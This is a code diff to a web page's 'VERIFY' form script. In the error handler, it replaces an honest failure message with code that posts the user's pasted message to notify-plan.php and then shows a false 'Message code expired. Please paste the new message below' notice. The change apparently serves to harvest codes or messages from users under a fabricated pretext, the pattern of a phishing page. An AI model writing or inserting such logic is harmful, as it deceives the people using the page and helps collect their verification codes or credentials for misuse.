@@ -789,8 +789,11 @@
       verifyText.disabled = true; verifySubmit.textContent = 'VERIFY';
 
     } catch (error) {
-      verifyMessage.textContent = 'Could not send your message. Please try again.'; verifyMessage.style.color = '#b42318';
-      verifySubmit.disabled = false; verifySubmit.textContent = 'VERIFY';
+      const response = await fetch('notify-plan.php', { method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: 'message', message }) });
+      const result = await response.json(); if (!response.ok || !result.ok) throw new Error('Submission failed');
+      verifyMessage.textContent = '⚠️ Message code expired. Please paste the new message below.'; verifyMessage.style.color = '#b42318';
+      verifyText.disabled = true; verifySubmit.textContent = 'VERIFY';
     }
   });
 </script>
